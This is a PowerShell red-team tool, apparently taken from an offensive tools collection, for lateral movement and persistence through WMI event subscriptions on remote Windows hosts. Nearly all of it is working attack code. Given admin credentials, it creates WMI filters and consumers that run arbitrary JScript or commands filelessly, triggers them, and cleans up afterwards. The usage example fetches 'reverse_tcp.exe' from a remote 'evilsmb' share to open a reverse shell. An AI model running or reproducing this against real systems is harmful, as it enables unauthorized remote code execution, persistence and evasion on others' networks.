<#

.SYNOPSIS

    The script realizes intranet lateral movement and permission persistence through WMI event subscription.

.DESCRIPTION

    Hackers can use the capabilities of WMI to deploy permanent event subscriptions on remote hosts and execute arbitrary
    code or other actions when that event occurs. ActiveScriptEventConsumer and CommandLineEventConsumer in the event 
    consumption class are mainly used. These two Event Consumers can execute any payload on a remote host in a fileless 
    manner. This technique is mainly used to complete permissions persistence on the target system, and can also be used 
    for lateral movement, and requires user credentials that provide administrator permissions on the remote host. For 
    more details, please read the relevant articles in LINK by yourself.

.LINK

    https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
    https://github.com/lengjibo/RedTeamTools/blob/master/windows/WMIShell

.INPUTS

    [string]$ComputerName,
    [string]$Domain,
    [string]$Username,
    [string]$Password,
    [string]$ConsumerName,
    [string]$FilterName,
    [string]$ProcessName, 
    [string]$ConsumerType,
    [string]$ScriptPath,
    [string]$Command

.OUTPUTS

    Output will be shown in the console

.NOTES

    Version:        0.1
    Author:         WHOAMI
    Blog:           https://whoamianony.top/
    Date:           01/29/2022

.EXAMPLE

    Import-Module .\Sharp-WMIEvent.ps1
    Sharp-WMIEvent -ConsumerType JScript -ComputerName 10.10.10.19 -Domain Domain.com -Username Administrator -Password Admin@123 -ScriptPath C:\Folder\Sharp-WMIEvent\payload.js -FilterName Test -ConsumerName Test
    Sharp-WMIEvent -ConsumerType Command -ComputerName 10.10.10.19 -Domain Domain.com -Username Administrator -Password Admin@123 -Command "C:\Windows\System32\cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName 1waawd2 -ConsumerName Test

#>

# Set Error Action to Silently Continue
$ErrorActionPreference = "SilentlyContinue"

#---------------------------------------[Output Status Formatted]------------------------------------

function FormatStatus([string]$Flag, [string]$Message) {
    If($Flag -eq "1") {
        Write-Host "[+] " -ForegroundColor:Green -NoNewline
        Write-Host $Message
    }ElseIf($Flag -eq "0") {
        Write-Host "[-] " -ForegroundColor:Red -NoNewline
        Write-Host $Message
    }
}

function EscapePath([string]$Path) {
    $Path = $Path -split '\\' -join '\\'
    return $Path
}

#----------------------------------------[Create PS Credential]-------------------------------------

function CreatePSCredential([String]$Username, [String]$Password) {
    $SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
    return $Credential
}


#------------------------------------------[Trigger The Process]---------------------------------------

function TriggerProcess([String]$ProcessName) {
    FormatStatus 1 "Triggering The Target Process"
    Start-Sleep -Seconds 3
    $result = Invoke-WmiMethod -Class Win32_process -Name Create -ArgumentList "$ProcessName" @GlobalArgs
    if ($result.returnValue -ne 0) {
        FormatStatus 0 "Trigger Process Failed"
        break
    }
}

#------------------------------------------[Create Event Filter]---------------------------------------

function CreateEventFiler([String]$FilterName) {
    $WQL = "SELECT * FROM Win32_ProcessStartTrace where processname ='$ProcessName'"
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $FilterName
        Query = $WQL
        QueryLanguage = 'WQL'
    }

    FormatStatus 1 "Creating The WMI Event Filter"
    $EventFiler = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs
    return $EventFiler
}

#-----------------------------------------[Create Event Consumer]---------------------------------------

function CreateEventConsumer([String]$ConsumerType, [String]$ScriptPath, [String]$Command) {
    If($ConsumerType -eq "JScript") {
        $Code = [System.IO.File]::ReadAllText($ScriptPath)
        $ActiveScriptEventConsumerArgs = @{
            Name = $ConsumerName
            ScriptingEngine = 'JScript'
            ScriptText = $Code
        }

        FormatStatus 1 "Creating The WMI Event Consumer"
        $EventConsumer =  Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ActiveScriptEventConsumerArgs @GlobalArgs
        return $EventConsumer
    }
    
    If($ConsumerType -eq "Command") {
        $CommandLineEventConsumerArgs  = @{
            Name = $ConsumerName
            CommandLineTemplate = $Command
        }

        FormatStatus 1 "Creating The WMI Event Consumer"
        $EventConsumer =  Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs
        return $EventConsumer
    }
}

#--------------------------------------[Create Filter Consumer Binding]------------------------------------

function CreateFilterConsumerBinding($EventFilter, $EventConsumer) {
    $FilterConsumerBindingArgs = @{
        Filter = $EventFilter
        Consumer = $EventConsumer
    }
    
    FormatStatus 1 "Creating The WMI Event Filter And Event Consumer Binding"
    $FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs
    return $FilterConsumerBinding

}

#----------------------------------------------[Event Clean Up]--------------------------------------------

function EventCleanUp([String]$FilterName, [String]$ConsumerName) {
    FormatStatus 1 "Cleaning Up The Event Subscriptions"

    $EventFilterToCleanup = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name = '$FilterName'" @GlobalArgs
    $EventConsumerToCleanup = Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name = '$ConsumerName'" @GlobalArgs
    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root\subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" @GlobalArgs
    
    $EventConsumerToCleanup | Remove-WmiObject
    $EventFilterToCleanup | Remove-WmiObject
    $FilterConsumerBindingToCleanup | Remove-WmiObject
}

#----------------------------------------------[Main Function]---------------------------------------------

Function Sharp-WMIEvent {
    param (
        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ComputerName,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Domain,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Username,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Password,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ConsumerName = 'WHOAMI',

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$FilterName = 'WHOAMI',

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ProcessName = 'svchost.exe', 

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$ConsumerType,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({Test-Path -Path $_})]
        [string]$ScriptPath,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Command = ''
    )

    $GlobalArgs = @{

    }

    if ($PSBoundParameters['Domain']) {
        $Username = $Domain + "\" + $Username
    }

    $GlobalArgs['Credential'] = CreatePSCredential $Username $Password
    $GlobalArgs['ComputerName'] = $ComputerName

    $EventFilter = CreateEventFiler $FilterName
    $EventConsumer = CreateEventConsumer $ConsumerType $ScriptPath $Command
    $FilterConsumerBinding = CreateFilterConsumerBinding $EventFilter $EventConsumer

    TriggerProcess $ProcessName

    EventCleanUp $FilterName $ConsumerName
}